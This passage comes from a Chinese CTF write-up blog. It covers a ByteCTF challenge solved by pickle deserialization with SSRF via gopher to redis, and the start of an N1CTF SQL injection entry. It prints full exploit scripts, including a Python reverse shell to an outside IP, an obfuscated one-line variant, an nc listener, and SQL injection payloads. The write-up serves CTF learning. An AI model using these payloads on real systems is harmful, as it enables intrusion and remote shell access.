class="hljs-string">&quot;file:///proc/self/cwd/bytectf/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>回显结果：</p><ol><li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># items.py</span><br><br><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfItem</span>(<span class="hljs-params">scrapy.Item</span>):</span><br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br>    byte_start = scrapy.Field()  <span class="hljs-comment"># 起始页面</span><br>    byte_url = scrapy.Field()  <span class="hljs-comment"># 当前页面</span><br>    byte_text = scrapy.Field()  <span class="hljs-comment"># text</span><br><br></code></pre></td></tr></table></figure></li><li>pipelines.py（等等，N0rth3 怎么那么熟悉，出题人可还行，没注意）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfPipeline</span>:</span><br>    <span class="hljs-comment"># 连接数据库</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 获取数据库连接信息</span><br>        MONGODB_HOST = <span class="hljs-string">&#x27;172.20.0.8&#x27;</span><br>        MONGODB_PORT = <span class="hljs-number">27017</span><br>        MONGODB_DBNAME = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_TABLE = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_USER = <span class="hljs-string">&#x27;N0rth3&#x27;</span><br>        MONGODB_PASSWD = <span class="hljs-string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span><br>        mongo_client = pymongo.MongoClient(<br>            <span class="hljs-string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))<br>        mongo_client[MONGODB_DBNAME].authenticate(<br>            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)<br>        mongo_db = mongo_client[MONGODB_DBNAME]<br>        self.table = mongo_db[MONGODB_TABLE]<br><span class="hljs-comment"># 处理item</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span><br><span class="hljs-comment"># 使用dict转换item，然后插入数据库</span><br>    quote_info = dict(item)<br>    print(quote_info)<br>    self.table.insert(quote_info)<br>    <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure></li><li>bytectf/<strong>init</strong>.py：空</li></ol><p>爬虫源码非常简单，全部文件读出来还会发现内网有一台 mongodb 其实为了防止大家跑偏这台 mongodb 特意加了密码，简单想一下就会发现并没有什么能利用的（原因：redis 机器的 ip 不是 localhost，所以拿到 shell 也没用），然后我们继续分析爬虫的源码（不是很能理解）。也就是其中的这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py 片段</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># 主键，原始 url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br></code></pre></td></tr></table></figure><p>可以看到是用 scrapy_redis 写的一个爬虫，功能即接收url，抓取其中的 url 链接然后爬取。</p><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p><ol><li>web 应用将任务传给redis，redis做为 broker（dumps）</li><li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li></ol><p>题解的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp1.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p><h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp2.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            python -c  &#x27;import socket,subprocess,os;</span><br><span class="hljs-string">                        </span><br><span class="hljs-string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span><br><span class="hljs-string">                        os.dup2(s.fileno(),0);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),1);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),2);</span><br><span class="hljs-string">                        p=subprocess.call(</span><br><span class="hljs-string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span><br><span class="hljs-string">                                          );</span><br><span class="hljs-string">                        &#x27;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p><p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;120.55.50.65&quot;</span>, <span class="hljs-number">9999</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p = subprocess.call(<br>    [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]<br>)<br><br></code></pre></td></tr></table></figure><p>在 <a href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>python -c &quot;(lambda <span class="hljs-strong">__g: [<span class="hljs-string">[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;</span>] in [<span class="hljs-string">(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;</span>]))]][<span class="hljs-string">0</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>] for __</span>g[<span class="hljs-string">&#x27;s&#x27;</span>] in [<span class="hljs-string">(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;os&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;os&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for __</span>g[<span class="hljs-string">&#x27;subprocess&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;subprocess&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;socket&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;socket&#x27;, __g, __g))</span>]][0])(globals())&quot;</span><br><span class="hljs-strong"></span><br></code></pre></td></tr></table></figure><p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.20.0.7:6379/_ZADD byte:requests 0 &quot;“</span><br><br></code></pre></td></tr></table></figure><p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p><ol><li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li><li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># 插入键和值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_set%<span class="hljs-number">20</span>runoobkey%<span class="hljs-number">20</span>redis<br><span class="hljs-comment"># 获取值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_get%<span class="hljs-number">20</span>runoobkey<br><br></code></pre></td></tr></table></figure></li></ol><p>通过前面读取源码，可以知道 host</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>     localhost<br>::<span class="hljs-number">1</span>           localhost ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span>       ip6-localnet<br>ff00::<span class="hljs-number">0</span>       ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span>       ip6-allnodes<br>ff02::<span class="hljs-number">2</span>       ip6-allrouters<br><span class="hljs-number">172.20</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>    <span class="hljs-number">914</span>c062c7588<br><br></code></pre></td></tr></table></figure><p>整理一下所有 ip 的思路（只看后缀）</p><ol><li>setting.py 中有一个 .7 的 ip</li><li>pipelines.py 中有一个 .8 的 ip</li><li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li></ol><p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p><hr><p>官方已经将环境关闭了，额，补不完了。</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月N1CTF部分web题解</title>
    <link href="/2020/10/17/2020%E5%B9%B410%E6%9C%8817%E6%97%A5-N1CTF/"/>
    <url>/2020/10/17/2020%E5%B9%B410%E6%9C%8817%E6%97%A5-N1CTF/</url>
    
    <content type="html"><![CDATA[<p>题解地址：<a href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p><hr><a id="more"></a><h1 id="Web-SignIn（SQL盲注-报错注入-布尔注入）"><a href="#Web-SignIn（SQL盲注-报错注入-布尔注入）" class="headerlink" title="Web-SignIn（SQL盲注+报错注入+布尔注入）"></a>Web-SignIn（SQL盲注+报错注入+布尔注入）</h1><p>思路历程大致是这样的，比赛后没环境（</p><ul><li>理解反序列化执行流程。</li><li>反序列化执行 toString 函数。（绕过 wakeup，利用 destuct 的 echo 函数）<ul><li>安装 php5.5</li><li>本地绕过</li><li>云端绕过（没有回显）</li></ul></li><li>利用 stristr 函数调用 toString 函数。<ul><li>时间盲注（时间函数被 WAF 了）</li><li>SQL注入之基于运行错误的Boolean注入<ul><li>语法错误和正常执行 noip</li><li>特殊错误 welcome（含数据库名或后面的函数报错）<ul><li>‘+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+’</li><li>‘+(select _(1))+’<br>MySQL</li><li>exp(~(select * from (select n1ctf_websign())a))</li></ul></li></ul></li></ul></li><li>构造 XFF 进行 SQL 注入。</li><li>编写 exp 进行报错<br>payload：’+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+’<br>利用 and 的特性进行判断。</li><li>最后从 n1key 中读出 flag。<ul><li>注意字段为 key 时需要使用别名。（与MySQL字段冲突）</li></ul></li></ul><p>反序列化：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png"></p><p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png"></p><p>用到的SQL语句:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># 查询数据库名字<br># <span class="hljs-keyword">database</span>()<br><br># 查询数据库信息<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># 查询文件读取权限<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># 查询当前用户<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># 查询数据库版本<br># version()<br><br># 查询表名的长度<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># 查询表名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># 判断字段名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br># 查询 ip 表。（边插入边查询，需要使用别名）<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 不使用字段名度值<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># 判断是否有数据<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># 查询文件<br># <span class="hljs-keyword">SELECT</span> 